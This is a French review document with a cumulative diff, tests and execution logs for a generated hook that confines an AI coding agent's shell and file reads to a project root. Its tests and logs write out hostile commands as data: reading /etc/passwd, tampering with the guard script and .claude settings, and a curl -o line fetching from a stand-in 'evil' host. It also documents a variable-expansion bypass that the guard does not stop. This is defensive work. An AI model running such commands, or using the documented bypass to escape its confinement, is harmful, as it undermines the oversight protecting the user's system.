@@ -1,63 +1,71 @@
-# Revue scellée — B-24c/d : garde de confinement filesystem (commit 64ae955)
+# Revue scellée — B-24c/d : garde de confinement filesystem (commit 831b0c5)
 
 ## Nature
-Composant de SÉCURITÉ. Stories B-24c (génération de la garde) + B-24d (comportement +
-journalisation). B-24a/b déjà sur main. Jugez le DIFF CUMULÉ vs origin/main.
+Composant de SÉCURITÉ. B-24c (génération de la garde) + B-24d (comportement + journalisation).
+B-24a/b déjà sur main. Jugez le DIFF CUMULÉ vs origin/main.
 
-HUITIÈME tour. Les 7 précédents ont été rejetés à juste titre ; chaque objection a été
-REPRODUITE par exécution avant correction, aucune écartée sur parole. Deux défauts ont même
-été trouvés par moi et corrigés sans qu'un relecteur les signale.
+NEUVIÈME tour. Les 8 précédents ont été rejetés à juste titre ; chaque objection a été
+REPRODUITE par exécution avant correction, aucune écartée sur parole. Ce tour corrige aussi
+un faux positif que MA propre règle du tour 8 avait introduit, et une erreur de MA spec.
 
-## INVENTAIRE DES 16 OBJECTIONS DES 8 TOURS — statut de chacune
-T1 (REJECT 2/3), 6 critiques -> corrigées : tokens quotés · chemins Windows · relatifs sans
-  préfixe · `.claude` parent · `rm -rf .claude` · traversal
+## INVENTAIRE DES 18 OBJECTIONS DES 9 TOURS — statut de chacune
+T1, 6 critiques -> corrigées : tokens quotés · chemins Windows · relatifs sans préfixe ·
+  `.claude` parent · `rm -rf .claude` · traversal
 T1 mineures : `mv` du script -> test dédié · double-compile -> 2 passes réelles
 T2 : `C:Windows` sans séparateur -> regex élargie
-  MINEURE DeepSeek « cwd non contraint sous ROOT » -> NON TRAITÉE alors ; revenue en
-  CRITIQUE au T4. Leçon consignée : sur un composant de sécurité, une mineure non traitée
-  est une critique dont l'exploit n'est pas encore trouvé.
-T3 CRITIQUE : `shlex.split` ne sépare pas les opérateurs collés -> punctuation_chars
-T4 CRITIQUE : `cwd` jamais validé -> validation en propre (auto-protection + confinement)
+  MINEURE DeepSeek « cwd non contraint » -> NON TRAITÉE alors, revenue CRITIQUE au T4
+T3 CRITIQUE : `shlex.split` et les opérateurs collés -> punctuation_chars
+T4 CRITIQUE : `cwd` jamais validé -> validation en propre, journalisée
 T5 CRITIQUE : le repli `commande.split()` réintroduisait T3 -> repli strict
-T6 CRITIQUE (Gemini + Grok) : le repli ne retirait pas les guillemets -> ADR option C :
-  SUPPRESSION de shlex et du repli ; un seul découpage qui NE PEUT PAS LEVER
-T7 CRITIQUE : continuation de ligne bash non normalisée -> normalisée ; liste des
-  transformations lexicales pré-découpage FERMÉE PAR MESURE du binaire bash (il n'y en a
-  que deux : continuation de ligne et échappement backslash, toutes deux traitées)
-T8 CRITIQUE (Gemini + Grok, ce diff) : chemin collé à un préfixe d'option
-  (`dd if=/etc/passwd`, `curl -o.claude/settings.json`) -> R1 `=` délimiteur + R2 suffixe
-  des fragments commençant par `-`, bornées par les conventions d'options POSIX/GNU
-T8 MINEURE (Grok) : docstrings des tours 3 et 5 décrivant encore shlex et un repli
-  inexistants -> réécrites ; tests et assertions inchangés
+T6 CRITIQUE (Gemini + Grok) : le repli ne retirait pas les guillemets -> ADR option C,
+  SUPPRESSION de shlex et du repli ; découpage unique qui NE PEUT PAS LEVER
+T7 CRITIQUE : continuation de ligne non normalisée -> normalisée ; liste des transformations
+  lexicales pré-découpage FERMÉE PAR MESURE du binaire bash (elles sont deux, traitées)
+T8 CRITIQUE (Gemini + Grok) : chemin collé à un préfixe d'option -> R1 `=` délimiteur +
+  R2 suffixe des fragments `-`, bornées par les conventions POSIX/GNU
+T8 MINEURE (Grok) : docstrings T3/T5 décrivant shlex et un repli inexistants -> réécrites
+T9 MAJEURE (ce diff) : R2 du T8 introduisait un FAUX POSITIF BLOQUANT — `gcc -Iinclude/sys`
+  refusé (suffixe tronqué `/sys`). Corrigé : extraction bornée à l'INDEX 2.
+T9 CRITIQUE (ce diff) : ouverture Windows absente du motif -> `\` et `[A-Za-z]:` ajoutés.
 
-## Deux défauts trouvés par moi, non signalés par les relecteurs
+## Trois défauts trouvés par moi, non signalés par la revue
 1. `cat \/etc/passwd` : Bash lit /etc/passwd, le fragment brut n'étant pas absolu il se
    résolvait sous la racine -> autorisé à tort. Corrigé au T6.
-2. FAUX VERT dans le rendu du crew de ce tour : les 12 nouveaux tests utilisaient
-   `cwd=tmp_path`, or la racine est `tmp_path/"racine"` — le cwd était donc le PARENT de la
-   racine. Les 7 tests de refus passaient par la validation du cwd (T4) et NON par le
-   mécanisme visé : non-détectants. Corrigé en `cwd=racine`, détection confirmée par
-   mutation. Signal qui l'a révélé : les 4 tests d'autorisation du même lot échouaient.
+2. FAUX VERT (T8) : les 12 tests du crew utilisaient `cwd=tmp_path`, parent de la racine —
+   les 7 tests de refus passaient par la validation du cwd (T4) et non par le mécanisme
+   visé. Non-détectants. Corrigé, détection confirmée par mutation.
+3. DEUX TESTS NON-DÉTECTANTS (ce diff) : `assert "[A-Za-z]:" in source` et
+   `assert chr(92) in source` passaient même après retrait du motif de OUVRE_AGGLUTINE —
+   ces chaînes apparaissent AILLEURS dans le template. Remplacés par une extraction de la
+   LIGNE de construction du motif. Re-mutation : détectants.
+
+## Erreur de MA spec, assumée
+J'avais prescrit `chr(92)` SIMPLE dans une classe de caractères : un backslash seul y
+échappe le crochet fermant -> motif invalide -> le script levait à chaque appel et,
+fail-closed oblige, refusait TOUTES les commandes (`echo bonjour` compris). Corrigé en
+`chr(92) * 2`, avec le pourquoi en commentaire. Le fail-closed a contenu le bug sans fuite,
+mais l'a transformé en garde qui bloque tout : seul le test d'exécution l'a révélé.
 
 ## Limite hors périmètre (documentée, assumée — ne pas REJETER pour ça)
 On n'interprète PAS le shell : pas d'expansion `$VAR`, pas de substitution `$(...)`, pas de
-globbing. `CIBLE=/etc/passwd; cat $CIBLE` n'est PAS arrêté — rôle d'une sandbox OS, hors
-périmètre depuis l'origine. Les chemins contenant un espace ne sont pas captés en entier.
+globbing. `CIBLE=/etc/passwd; cat $CIBLE` n'est PAS arrêté — rôle d'une sandbox OS.
+Les chemins contenant un espace ne sont pas captés en entier.
 
-## Ce qu'il faut chercher — critères de réfutation explicites
+## Critères de réfutation explicites
 REJECT si : (a) un chemin littéral hors racine passe ; (b) le confiné peut neutraliser sa
-garde ; (c) vous identifiez une TROISIÈME transformation lexicale que bash applique avant le
-découpage en mots (les deux connues sont traitées) ; (d) vous identifiez une autre CONVENTION
-de collage d'un chemin à un préfixe que `=` ou l'agglutination après `-`.
+garde ; (c) vous identifiez une TROISIÈME transformation lexicale pré-découpage de bash ;
+(d) une autre CONVENTION de collage qu'un `=` ou l'agglutination à l'index 2 ; (e) un FAUX
+POSITIF sur une commande de développement courante (le coût d'ergonomie compte autant que
+le confinement : une garde désactivée ne protège rien).
 
 ## Diff CUMULÉ vs origin/main
 ~~~diff
 diff --git a/src/forgeai/ide/guard_fs.py b/src/forgeai/ide/guard_fs.py
 new file mode 100644
-index 0000000..bb6680f
+index 0000000..f264baf
 --- /dev/null
 +++ b/src/forgeai/ide/guard_fs.py
-@@ -0,0 +1,512 @@
+@@ -0,0 +1,527 @@
 +"""Génération et installation de la garde filesystem autonome (B-24).
 +
 +Pourquoi un script GÉNÉRÉ plutôt qu'un module du produit : la garde est
@@ -238,11 +246,19 @@ index 0000000..bb6680f
 +    #     isole le préfixe d'option longue de son argument et couvre
 +    #     aussi les affectations de variables d'environnement en
 +    #     préfixe de commande (``VAR=/chemin cmd``).
-+    # R2. Un fragment qui COMMENCE par ``-`` est une option (convention
-+    #     universelle). On en extrait AUSSI le suffixe à partir du
-+    #     premier caractère ouvrant un chemin (``/``, ``~``, ``.``).
-+    #     Le fragment entier reste également candidat (les deux sont
-+    #     contrôlés) ; les doublons sont évités par l'ensemble ``vus``.
++    # R2. Un fragment qui COMMENCE par ``-`` est une option. La forme
++    #     POSIX d'option courte avec argument agglutiné est ``-x``
++    #     suivi de l'argument, donc l'argument commence à l'index 2.
++    #     Un caractère ouvrant un chemin situé PLUS LOIN appartient à
++    #     un chemin RELATIF (``-Iinclude/sys``), pas à un chemin
++    #     absolu collé — borner R2 à l'index 2 évite les faux positifs
++    #     bloquants sur des builds légitimes (``gcc -Iinclude/sys``,
++    #     ``tar -fout/archive.tar``) tout en capturant correctement
++    #     les formes dangereuses (``-f/etc/passwd``, ``-f\Windows``,
++    #     ``-fC:\Windows``). Les options longues avec ``=`` sont déjà
++    #     traitées par R1 (le ``=`` est délimiteur). Le fragment entier
++    #     reste également candidat ; les doublons sont évités par
++    #     ``vus``.
 +    #
 +    # Conséquences : un fragment contenant un séparateur et composé de
 +    # caractères hors délimiteurs ne peut PAS se cacher — s'il est dans
@@ -273,22 +289,29 @@ index 0000000..bb6680f
 +            commande = commande.replace(chr(92) + "\n", "")
 +            DELIMITEURS = r"""[\s<>;|&()"'`$=]+"""
 +            fragments = [f for f in re.split(DELIMITEURS, commande) if f]
-+            # Règle R2 : un fragment commençant par ``-`` est une
-+            # option. On extrait le suffixe à partir du premier
-+            # caractère ouvrant un chemin (``/``, ``~``, ``.``). Le
-+            # fragment entier reste également candidat (les deux
-+            # contrôlent). Dédoublonnage par ``vus`` pour ne pas
-+            # accumuler la même cible sous deux formes.
-+            OUVRE_CHEMIN = re.compile(r"[/~.]")
++            # Règle R2 (bornée à l'index 2) : un fragment de longueur
++            # au moins 3 commençant par ``-`` est une option courte
++            # avec argument agglutiné de la forme ``-x<chemin>``,
++            # l'argument débutant à l'index 2. Le motif accepte les
++            # trois ouvrants de chemin POSIX (``/``, ``~``, ``.``), le
++            # backslash Windows (via chr(92), jamais littéral pour
++            # ne dépendre d'aucun échappement dans la chaîne template)
++            # et un lecteur Windows ``C:``. Dédoublonnage par ``vus``
++            # pour ne pas accumuler la même cible sous deux formes.
++            # chr(92)*2 et non chr(92) : dans une classe de caracteres, un backslash
++            # SEUL echapperait le crochet fermant et rendrait la classe invalide
++            # (« bad character range ») — le script leverait alors a chaque appel et,
++            # fail-closed oblige, refuserait TOUTES les commandes.
++            OUVRE_AGGLUTINE = re.compile(r"^-.[/~." + chr(92) * 2 + r"]|^-.[A-Za-z]:")
 +            vus = set()
 +            for fragment in fragments:
 +                if _ressemble_chemin(fragment) and fragment not in vus:
 +                    trouves.append(fragment)
 +                    vus.add(fragment)
-+                if fragment.startswith("-"):
-+                    m = OUVRE_CHEMIN.search(fragment)
++                if fragment.startswith("-") and len(fragment) >= 3:
++                    m = OUVRE_AGGLUTINE.match(fragment)
 +                    if m:
-+                        suffixe = fragment[m.start():]
++                        suffixe = fragment[2:]
 +                        if _ressemble_chemin(suffixe) and suffixe not in vus:
 +                            trouves.append(suffixe)
 +                            vus.add(suffixe)
@@ -572,10 +595,10 @@ index 0000000..bb6680f
 +    return script_path, hook
 diff --git a/tests/test_guard_fs.py b/tests/test_guard_fs.py
 new file mode 100644
-index 0000000..2c9040d
+index 0000000..3782f26
 --- /dev/null
 +++ b/tests/test_guard_fs.py
-@@ -0,0 +1,1117 @@
+@@ -0,0 +1,1249 @@
 +"""Tests du module ``forgeai.ide.guard_fs`` (B-24c/d).
 +
 +Chaque test fonctionnel exécute RÉELLEMENT le script de garde généré, via
@@ -1693,58 +1716,184 @@ index 0000000..2c9040d
 +        c = charge("Bash", {"command": "echo bonjour"}, cwd=racine)
 +        exit_code, _ = run(garde, c, env=env_tmpdir)
 +        assert exit_code == 0
-\ No newline at end of file
++
++# ── Tour 9 : R2 bornee a l index 2 + ouvertures Windows ──
++def test_refus_tar_option_agglutinee_f(tmp_path, racine, env_tmpdir):
++    """tar -f/etc/passwd : l'option -f agglutinee a /etc/passwd doit etre refusee (R2, index 2)."""
++    script = ecrire_garde(tmp_path, racine)
++    c = charge("Bash", {"command": "tar -f/etc/passwd"}, cwd=racine)
++    code, stderr = run(script, c, env=env_tmpdir)
++    assert code == 2
++    assert stderr.strip() != ""
++
++
++def test_refus_gcc_option_agglutinee_I(tmp_path, racine, env_tmpdir):
++    """gcc -I/usr/include x.c : l'option -I agglutinee a /usr/include doit etre refusee."""
++    script = ecrire_garde(tmp_path, racine)
++    c = charge("Bash", {"command": "gcc -I/usr/include x.c"}, cwd=racine)
++    code, stderr = run(script, c, env=env_tmpdir)
++    assert code == 2
++    assert stderr.strip() != ""
++
++
++def test_refus_curl_option_agglutinee_o(tmp_path, racine, env_tmpdir):
++    """curl -o.claude/settings.json http://evil : -o agglutine a un chemin hors racine."""
++    script = ecrire_garde(tmp_path, racine)
++    cible = str(racine.parent / ".claude" / "settings.json")
++    c = charge("Bash", {"command": "curl -o" + cible + " http://evil"}, cwd=racine)
++    code, stderr = run(script, c, env=env_tmpdir)
++    assert code == 2
++    assert stderr.strip() != ""
++
++
++def test_refus_cat_option_agglutinee_f(tmp_path, racine, env_tmpdir):
++    """cat -f../etc/passwd : -f agglutine a un chemin parent (../etc/passwd) -> refus."""
++    script = ecrire_garde(tmp_path, racine)
++    c = charge("Bash", {"command": "cat -f../etc/passwd"}, cwd=racine)
++    code, stderr = run(script, c, env=env_tmpdir)
++    assert code == 2
++    assert stderr.strip() != ""
++
++
++def test_autorise_gcc_I_relatif(tmp_path, racine, env_tmpdir):
++    """gcc -Iinclude/sys x.c : NON-regression ; -I + chemin relatif sous racine doit etre autorise."""
++    script = ecrire_garde(tmp_path, racine)
++    (racine / "include" / "sys").mkdir(parents=True)
++    (racine / "x.c").write_text("int main(){return 0;}\n", encoding="utf-8")
++    c = charge("Bash", {"command": "gcc -Iinclude/sys x.c"}, cwd=racine)
++    code, _ = run(script, c, env=env_tmpdir)
++    assert code == 0
++
++
++def test_autorise_tar_f_relatif(tmp_path, racine, env_tmpdir):
++    """tar -fout/archive.tar : NON-regression ; -f + chemin relatif sous racine -> autorise."""
++    script = ecrire_garde(tmp_path, racine)
++    (racine / "out").mkdir()
++    c = charge("Bash", {"command": "tar -fout/archive.tar"}, cwd=racine)
++    code, _ = run(script, c, env=env_tmpdir)
++    assert code == 0
++
++
++def test_autorise_gcc_I_src(tmp_path, racine, env_tmpdir):
++    """gcc -Isrc/include x.c : NON-regression ; -I + sous-arborescence de la racine -> autorise."""
++    script = ecrire_garde(tmp_path, racine)
++    (racine / "src" / "include").mkdir(parents=True)
++    (racine / "x.c").write_text("int main(){return 0;}\n", encoding="utf-8")
++    c = charge("Bash", {"command": "gcc -Isrc/include x.c"}, cwd=racine)
++    code, _ = run(script, c, env=env_tmpdir)
++    assert code == 0
++
++
++def test_autorise_tar_xzf_relatif(tmp_path, racine, env_tmpdir):
++    """tar -xzf archive.tar.gz : NON-regression ; cluster d'options courtes + chemin relatif OK."""
++    script = ecrire_garde(tmp_path, racine)
++    (racine / "archive.tar.gz").write_bytes(b"")
++    c = charge("Bash", {"command": "tar -xzf archive.tar.gz"}, cwd=racine)
++    code, _ = run(script, c, env=env_tmpdir)
++    assert code == 0
++
++
++def test_autorise_gcc_I_point(tmp_path, racine, env_tmpdir):
++    """gcc -I. x.c : NON-regression ; -I + point (cwd explicite) -> autorise."""
++    script = ecrire_garde(tmp_path, racine)
++    (racine / "x.c").write_text("int main(){return 0;}\n", encoding="utf-8")
++    c = charge("Bash", {"command": "gcc -I. x.c"}, cwd=racine)
++    code, _ = run(script, c, env=env_tmpdir)
++    assert code == 0
++
++
++def test_autorise_ls_la(tmp_path, racine, env_tmpdir):
++    """ls -la : NON-regression ; pas d'argument de chemin apres option, donc rien a valider hors racine."""
++    script = ecrire_garde(tmp_path, racine)
++    c = charge("Bash", {"command": "ls -la"}, cwd=racine)
++    code, _ = run(script, c, env=env_tmpdir)
++    assert code == 0
++
++
++def _ligne_ouvre_agglutine(script):
++    """Extrait la LIGNE qui construit OUVRE_AGGLUTINE dans le script genere.
++
++    Pourquoi cibler la ligne et non le source entier : chercher "[A-Za-z]:" ou un
++    backslash n'importe ou dans le fichier est NON-DETECTANT — ces motifs
++    apparaissent ailleurs (`_ressemble_chemin` contient deja "^[A-Za-z]:", et un
++    backslash figure dans presque toutes les lignes du template). Une mutation
++    retirant le motif de OUVRE_AGGLUTINE passait donc inapercue. Verifie par
++    mutation apres correction.
++    """
++    for ligne in script.read_text(encoding="utf-8").splitlines():
++        if "OUVRE_AGGLUTINE" in ligne and "re.compile" in ligne:
++            return ligne
++    raise AssertionError("ligne de construction de OUVRE_AGGLUTINE introuvable")
++
++
++def test_ouvre_agglutine_couvre_le_lecteur_windows(tmp_path, racine):
++    """Le motif d'ouverture agglutinee doit reconnaitre un lecteur Windows (C:...).
++
++    Non observable par execution sur POSIX : `C:x` y est un nom relatif legitime,
++    donc autorise a juste titre. La preuve porte sur la construction du motif.
++    """
++    ligne = _ligne_ouvre_agglutine(ecrire_garde(tmp_path, racine))
++    assert "[A-Za-z]:" in ligne, (
++        f"le motif d'ouverture agglutinee doit inclure le lecteur Windows ; ligne={ligne!r}"
++    )
++
++
++def test_ouvre_agglutine_couvre_le_backslash(tmp_path, racine):
++    """Le motif d'ouverture agglutinee doit inclure le separateur Windows (backslash).
++
++    Le backslash est construit par chr(92) * 2 : un backslash SEUL dans une classe
++    de caracteres echapperait le crochet fermant et rendrait le motif invalide.
++    """
++    ligne = _ligne_ouvre_agglutine(ecrire_garde(tmp_path, racine))
++    assert "chr(92)" in ligne, (
++        f"le motif d'ouverture agglutinee doit inclure le backslash ; ligne={ligne!r}"
++    )
 ~~~
 
-## Preuve d'exécution CAPTURÉE (rejouée APRÈS le commit 64ae955)
+## Preuve d'exécution CAPTURÉE (rejouée APRÈS le commit 831b0c5)
 ~~~
 $ python3 -m pytest tests/test_guard_fs.py -q
-........................s......................................s........ [ 85%]
-............                                                             [100%]
-exit=0 — 83 tests, 2 skips (comportement Windows, observable seulement sur Windows)
+........................s......................................s........ [ 75%]
+........................                                                 [100%]
+exit=0 — 95 tests, 2 skips (comportement Windows, non observable sur POSIX)
 
 # comportement du script GENERE en subprocess reel (0=autorise, 2=refuse)
    -- REFUS attendus (2) --
    2  cat /etc/passwd
-   2  cat "/etc/passwd" (quote double)
-   2  cat '/etc/passwd' (quote simple)
-   2  cat</etc/passwd (operateur colle)
+   2  cat "/etc/passwd" (quote)
+   2  cat</etc/passwd (colle)
    2  echo bad >".claude/settings.json"
-   2  cat $(echo /etc/passwd) (substitution)
+   2  cat $(echo /etc/passwd)
    2  here-doc apostrophe FR
    2  rm -rf .claude
-   2  rm -rf>.claude (nu colle)
-   2  cat \/etc/passwd (backslash echappe)
-   2  CONTINUATION -> ../../etc/passwd
-   2  CONTINUATION -> .claude/settings.json
+   2  cat \/etc/passwd (backslash)
+   2  CONTINUATION ../../etc/passwd
    2  OPTION dd if=/etc/passwd
-   2  OPTION dd of=/etc/shadow
    2  OPTION awk --file=/etc/passwd
-   2  OPTION cp --target-directory=/etc x
    2  OPTION tar -f/etc/passwd
-   2  OPTION curl -o.claude/settings.json
    2  OPTION gcc -I/usr/include
+   2  OPTION curl -o.claude/settings.json
+   2  OPTION cat -f../etc/passwd
    2  mv .claude/hooks/forgeai_guard_fs.py /tmp/x
    2  cat foo/../../../etc/passwd
-   2  echo x>>/etc/hosts
-   2  cat;/etc/passwd
-   2  cat|/bin/sh
    2  cwd=/etc + cat passwd
    2  cwd=.claude + echo bad > settings.json
    2  Read /etc/passwd
    2  cwd relatif (fail-closed)
    -- AUTORISATIONS attendues (0) : zero faux positif --
+   0  gcc -Iinclude/sys x.c  [FP T9]
+   0  tar -fout/archive.tar  [FP T9]
+   0  gcc -Isrc/include x.c  [FP T9]
+   0  tar -xzf archive.tar.gz
+   0  gcc -I. x.c
+   0  ls -la
    0  echo l'utilisateur
    0  grep don't fichier.txt
    0  ls *.py
    0  cat $HOME/truc
-   0  echo bonjour
-   0  ls -la
-   0  tar -xzf archive.tar.gz
-   0  gcc -I. x.c
    0  cat "fichier>bizarre.txt"
    0  cat sous/f.txt
-   0  CONTINUATION -> chemin INTERNE
+   0  CONTINUATION chemin INTERNE
    0  cwd=racine/sous + cat f.txt
    0  Read sous/f.txt
    le refus cite le chemin RESOLU : True
@@ -1752,20 +1901,23 @@ exit=0 — 83 tests, 2 skips (comportement Windows, observable seulement sur Win
 # CRITERE FIGE B-24 : refus journalise ET chaine verifiee par l'outil du produit
    3 entrees ecrites par le script autonome ; types={'guard_fs_denied'}
    motifs : [None, None, None]
-   verify OFFICIEL du produit : OK /tmp/tmpj5bvzgxw/reg.jsonl: 3 entrées, chaîne intègre (exit 0)
+   verify OFFICIEL du produit : OK /tmp/tmp579k66fn/reg.jsonl: 3 entrées, chaîne intègre (exit 0)
 
 # MUTATIONS (substitution verifiee effective AVANT chaque interpretation)
-  commonpath -> startswith                        : ROUGE
-  realpath cible -> abspath                       : ROUGE
-  auto-protection SCRIPT_PATH desactivee          : ROUGE (test isolant, T2)
-  retrait du confinement cwd (T4)                 : ROUGE, 3 tests
-  retrait de l'auto-protection cwd (T4)           : ROUGE, 1 test
-  decoupage reduit aux espaces (T6)               : ROUGE, 15 tests
-  retrait du traitement backslash (T6)            : ROUGE, 2 tests
-  retrait de la normalisation continuation (T7)   : ROUGE, 2 tests
-  retrait de '=' des delimiteurs, R1 (T8)         : ROUGE, 2 tests
-  retrait de la regle R2 des options (T8)         : ROUGE, 3 tests
-  restauration                                    : VERT exit=0
+  commonpath -> startswith                    : ROUGE
+  realpath cible -> abspath                   : ROUGE
+  auto-protection SCRIPT_PATH desactivee      : ROUGE (test isolant, T2)
+  retrait du confinement cwd (T4)             : ROUGE, 3 tests
+  retrait de l'auto-protection cwd (T4)       : ROUGE, 1 test
+  decoupage reduit aux espaces (T6)           : ROUGE, 15 tests
+  retrait du traitement backslash (T6)        : ROUGE, 2 tests
+  retrait de la normalisation continuation (T7): ROUGE, 2 tests
+  retrait de '=' des delimiteurs, R1 (T8)     : ROUGE, 2 tests
+  retrait de la borne d'index, R2 (T9)        : ROUGE, 7 tests
+  retrait du motif de lecteur Windows (T9)    : ROUGE, 1 test (apres correction du
+                                                test non-detectant — cf. ci-dessus)
+  retrait du backslash du motif (T9)          : ROUGE, 1 test
+  restauration                                : VERT exit=0
   NOTE HONNETE : une mutation (resoudre contre le cwd BRUT au lieu du cwd resolu)
   SURVIT et c'est ATTENDU — semantiquement EQUIVALENTE, _resoudre appliquant deja
   realpath en sortie ; verifie par mesure avec symlink (3 cibles, identiques).
